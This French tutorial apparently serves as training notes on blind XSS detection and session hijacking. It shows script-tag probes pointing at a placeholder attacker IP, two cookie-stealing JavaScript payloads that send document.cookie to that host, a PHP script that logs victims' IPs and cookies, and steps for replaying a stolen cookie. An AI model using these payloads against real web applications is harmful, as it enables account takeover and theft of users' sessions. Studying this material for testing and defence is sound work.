# Session Hijacking

***

<mark style="color:blue;">**1. Introduction aux attaques XSS et au détournement de session (Session Hijacking)**</mark>

Les applications web modernes utilisent des **cookies** pour maintenir la session d'un utilisateur lors de différentes sessions de navigation. Cela permet à l'utilisateur de ne se connecter qu'une seule fois et de conserver sa session active même s'il revient sur le même site plus tard.

Cependant, si un utilisateur malveillant parvient à obtenir les données des cookies du navigateur de la victime, il pourrait alors accéder au compte de la victime sans avoir besoin de connaître ses identifiants. Cette attaque est connue sous le nom de **détournement de session** ou **vol de cookies**.

Pour réaliser cette attaque, un attaquant pourrait injecter du **JavaScript** dans la page de l'application cible. Si le script malveillant s'exécute, l'attaquant peut récupérer les cookies de la victime et les envoyer à son serveur.

***

<mark style="color:blue;">**2. Détection d'un XSS aveugle (Blind XSS)**</mark>

Un **XSS aveugle** se produit lorsque la vulnérabilité est déclenchée sur une page à laquelle nous n'avons pas accès directement. Par exemple, cela peut se produire avec des formulaires qui ne sont accessibles que par certains utilisateurs comme les **administrateurs** (p. ex. : formulaires de contact, commentaires, tickets de support).

Dans ce type de cas, nous ne pouvons pas voir immédiatement l'effet de notre injection de code. Pour détecter cette vulnérabilité, nous allons utiliser une technique qui consiste à injecter un **script distant** dans le formulaire. Si ce script est exécuté, il enverra une requête HTTP à notre serveur, ce qui nous permettra de savoir si la page est vulnérable.

**Étapes pour détecter un XSS aveugle :**

1.  **Injection d'un script** dans un champ de formulaire. Par exemple :

    ```html
    <script src="http://NOTRE_IP/username"></script>
    ```

    Cela permettra à notre serveur de recevoir une requête pour identifier quel champ a été vulnérable (ici, `username`).
2.  **Configurer un serveur pour écouter les requêtes HTTP :**

    ```bash
    mkdir /tmp/tmpserver
    cd /tmp/tmpserver
    sudo php -S 0.0.0.0:80
    ```
3.  **Tester chaque champ du formulaire** en injectant des scripts comme :

    ```html
    <script src="http://NOTRE_IP/username"></script>  # pour le champ username
    <script src="http://NOTRE_IP/fullname"></script>  # pour le champ full name
    ```
4. **Vérifier les requêtes reçues sur notre serveur** pour identifier le champ vulnérable.

***

<mark style="color:blue;">**3. Exploitation de la vulnérabilité XSS et détournement de session**</mark>

Une fois qu'un **XSS aveugle** est confirmé, nous pouvons utiliser un **payload JavaScript** pour voler le cookie de session de la victime. Cela nécessite un script JavaScript qui envoie les cookies de la victime à notre serveur.

**Exemples de payloads XSS pour le vol de cookies :**

*   **Payload 1** :

    ```javascript
    document.location = 'http://NOTRE_IP/index.php?c=' + document.cookie;
    ```
*   **Payload 2** (moins suspect) :

    ```javascript
    new Image().src = 'http://NOTRE_IP/index.php?c=' + document.cookie;
    ```

Dans ces deux cas, le cookie de session de la victime sera envoyé à notre serveur. Nous pouvons sauvegarder ce cookie avec un script PHP sur notre serveur :

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Ce script enregistre les cookies envoyés dans un fichier `cookies.txt` et peut contenir des informations comme l'IP de la victime et les cookies volés.

***

<mark style="color:blue;">**4. Utilisation du cookie volé pour l'accès à la session de la victime**</mark>

Une fois que nous avons le cookie de session, nous pouvons l'utiliser pour accéder au compte de la victime. Voici comment procéder :

1. Ouvrir l'application dans un navigateur (par exemple, Firefox).
2. Aller dans **Developer Tools** (Outils de développement) et activer la **Storage Bar**.
3. Cliquer sur le bouton `+` en haut à droite et ajouter un nouveau cookie en utilisant le nom du cookie et la valeur obtenue du fichier `cookies.txt`.

Par exemple :

* **Nom** : `cookie`
* **Valeur** : `f904f93c949d19d870911bf8b05fe7b2`

Après avoir ajouté ce cookie, nous pouvons rafraîchir la page, et nous serons connectés en tant que la victime.

***
